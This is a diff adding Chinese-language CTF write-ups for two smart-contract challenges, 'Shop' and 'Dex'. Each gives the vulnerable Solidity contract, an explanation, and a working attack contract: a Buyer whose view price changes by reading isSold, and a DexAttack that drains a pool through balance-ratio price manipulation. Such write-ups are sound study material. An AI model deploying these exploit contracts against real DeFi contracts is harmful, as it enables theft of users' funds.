@@ -1250,3 +1250,244 @@ contract Attack {
 ```js
 await contract.setWithdrawPartner("0x096fb29B3474Fe58D8da00d52EAB27eF9b75Bb02")
 ```
+
+# Shop
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface Buyer {
+    function price() external view returns (uint256);
+}
+
+contract Shop {
+    uint256 public price = 100;
+    bool public isSold;
+
+    function buy() public {
+        Buyer _buyer = Buyer(msg.sender);
+
+        if (_buyer.price() >= price && !isSold) {
+            isSold = true;
+            price = _buyer.price();
+        }
+    }
+}
+```
+这个和之前做过的题有点像，第一次返回一个大于price的值，第二次返回一个小的值。但这个题和之前的不同的一点是函数是 view 修饰的。view 不能修改合约状态。所以看起来不能用之前的思路做了？但是 Buyer 合约可以反过来查询 Shop 的 isSold 状态，这样 buyer 就没有进行任何修改也可以改变 flag。
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+interface IShop {
+    function isSold() external view returns (bool);
+    function buy() external;
+}
+
+
+contract Buyer {
+    IShop shop = IShop(0x9543f67A97E33b4209CCBfe92A0370D98E1E3245);
+
+    function price() public view returns (uint256) {
+        if (shop.isSold()) return 1;
+        else return 100;
+    } 
+
+    function attack() public {
+        shop.buy();
+    }
+}
+```
+
+# Dex
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
+import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
+import "openzeppelin-contracts-08/access/Ownable.sol";
+
+contract Dex is Ownable {
+    address public token1;
+    address public token2;
+
+    constructor() {}
+
+    function setTokens(address _token1, address _token2) public onlyOwner {
+        token1 = _token1;
+        token2 = _token2;
+    }
+
+    function addLiquidity(address token_address, uint256 amount) public onlyOwner {
+        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
+    }
+
+    function swap(address from, address to, uint256 amount) public {
+        require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
+        require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
+        uint256 swapAmount = getSwapPrice(from, to, amount);
+        IERC20(from).transferFrom(msg.sender, address(this), amount);
+        IERC20(to).approve(address(this), swapAmount);
+        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
+    }
+
+    function getSwapPrice(address from, address to, uint256 amount) public view returns (uint256) {
+        return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
+    }
+
+    function approve(address spender, uint256 amount) public {
+        SwappableToken(token1).approve(msg.sender, spender, amount);
+        SwappableToken(token2).approve(msg.sender, spender, amount);
+    }
+
+    function balanceOf(address token, address account) public view returns (uint256) {
+        return IERC20(token).balanceOf(account);
+    }
+}
+
+contract SwappableToken is ERC20 {
+    address private _dex;
+
+    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)
+        ERC20(name, symbol)
+    {
+        _mint(msg.sender, initialSupply);
+        _dex = dexInstance;
+    }
+
+    function approve(address owner, address spender, uint256 amount) public {
+        require(owner != _dex, "InvalidApprover");
+        super._approve(owner, spender, amount);
+    }
+}
+```
+合约的两个主要函数是 swap（代币交换）和 getSwapPrice（获取代币的交换价格）。合约允许用户交换 token1 和 token2，并根据每种代币在合约中的余额来动态调整它们的价格。价格的计算方式为：amount * toTokenBalance / fromTokenBalance，也就是说，价格取决于代币在合约中的相对余额。目标是通过价格操纵攻击搞走token。
+初始条件：你有 10 个 token1 和 10 个 token2。DEX 合约中有 100 个 token1 和 100 个 token2。
+
+在 etherscan 可以看到：https://sepolia.etherscan.io/tx/0x19abeef36016d40f68cedeb6cf4ecb76c7e1bce9600473928682777ec45394c1
+- DEX: 0x30469eb59016b840DA21b1d36d50f7A9e436a2B9
+- Token1: 0x0ab849721138d22725d0f6cf73874b0fabef5641
+- Token2: 0xa970f48909537a0909d15093bbebb581dbadd7b8
+
+第一次做这种题，先手算一下：
+```
+EXP
+
+a：10， b:10
+A:100,    B:100
+
+Swap1: 10a->b
+
+10*100=100*output => output=10
+
+a:0, b:20
+A:110, B:90
+
+Swap2: 20b->a
+
+20*110=90*output => output = 20*110//90 = 24
+
+a:24  b:0
+A:86,  B:110
+
+Swap3: 24a->b
+
+24*110=86*output => output = 30
+
+a:0, b:30
+A: 110, B: 80
+
+Swap4: 30b->a
+
+output = 30*110/80=41
+
+a:41, b:0
+A:69, B: 110
+
+Swap5: 41a->b
+
+Output = 110*41/69=65
+
+a:0,b:65
+A:110,B:45
+
+Swap6: 65b->a
+
+Output=110*65/45=158 > 110 Revert
+
+```
+结论是大概第6次就可以换完。但直接全换回导致最后余额不够，revert。所以需要构造刚好第6次换能等于110。所以不必每次都换完。
+```
+a:0,b:65
+A:110,B:45
+
+Swap6: 65b->a
+
+Output=110*65/45=158 > 110 Revert
+
+重新思考这里，稍微修改一下：
+
+a:0,b:65
+A:110,B:45
+
+Swap6: 45b->a
+
+Output=110*45/45=110 提取全部
+
+思考上面这个构造，本质上是我拥有的一个token的数量大于了合约里对应的token，所以可以用相同的token数量把他换光。于是得到了POC。
+```
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "./dex.sol";
+import "openzeppelin-contracts/token/ERC20/IERC20.sol";
+
+contract DexAttack {
+    Dex public dex;
+    IERC20 public token1;
+    IERC20 public token2;
+
+    constructor(address _dex, address _token1, address _token2) {
+        dex = Dex(_dex);
+        token1 = IERC20(_token1);
+        token2 = IERC20(_token2);
+    }
+
+    function attack() public {
+        // 批准 dex 使用 token1 和 token2
+        token1.approve(address(dex), type(uint256).max);
+        token2.approve(address(dex), type(uint256).max);
+
+        // 第一步：用 10 个 token1 换 10 个 token2
+        dex.swap(address(token1), address(token2), 10); 
+
+        // 循环操作，直到合约中的一种代币被耗尽
+        while (token1.balanceOf(address(dex)) > 0 && token2.balanceOf(address(dex)) > 0) {
+            uint256 dexToken1Balance = token1.balanceOf(address(dex));
+            uint256 dexToken2Balance = token2.balanceOf(address(dex));
+
+            uint256 myToken1Balance = token1.balanceOf(address(this));
+            uint256 myToken2Balance = token2.balanceOf(address(this));
+
+            // 检查持有代币的数量是否大于 DEX 中相应的代币数量
+            if (myToken1Balance >= dexToken1Balance) {
+                dex.swap(address(token1), address(token2), dexToken1Balance);
+                break;
+            } else if (myToken2Balance >= dexToken2Balance) {
+                dex.swap(address(token2), address(token1), dexToken2Balance);
+                break;
+            }
+
+            // 选择较小余额的代币进行交换，以操纵价格
+            if (dexToken1Balance > dexToken2Balance) {
+                dex.swap(address(token2), address(token1), myToken2Balance);
+            } else {
+                dex.swap(address(token1), address(token2), myToken1Balance);
+            }
+        }
+    }
+}
+```
+部署攻击合约，然后通过 at address 加载两个token合约，先把token转给攻击合约。然后点击 attack 即可。
+- 这个题我看网上题解好像都是手算然后硬编码的hhh，我感觉我这个POC通用一点。
